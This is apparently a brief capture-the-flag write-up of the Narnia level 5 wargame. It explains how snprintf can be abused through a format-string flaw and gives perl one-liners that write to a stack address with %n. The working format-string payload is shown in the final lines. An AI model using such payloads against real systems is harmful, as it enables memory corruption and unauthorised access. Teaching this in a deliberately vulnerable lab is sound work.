Let's look at the code:

```
cat narnia5.c
```

Ok, so the main difference between this challenge and the others is that `strcpy()` is not used. Instead, `snprintf()` is used.

But is the `snprintf` function safe? It turns out [not](https://stackoverflow.com/questions/10112984/buffer-overflow-using-snprintf).
Because it works like `printf` (except for the fact that the user chooses where the output will be printed).
I already had the opportunity to take advantage of `printf`'s weakness in the [microcorruption](https://github.com/SimchaTeich/Microcorruption/tree/main/11%20-%20Addis%20Ababa) challenge, so as soon as I received the reminder about `%n`, I understood what had to be done:

```
./narnia5
```

```
./narnia5 $(perl -e 'print "\x30\xd5\xff\xff" . "A"x(500-4) . "%n"')
```

./narnia5 $(perl -e 'print "\x30\xd3\xff\xff" . "A"x(500-4) . "%n"')
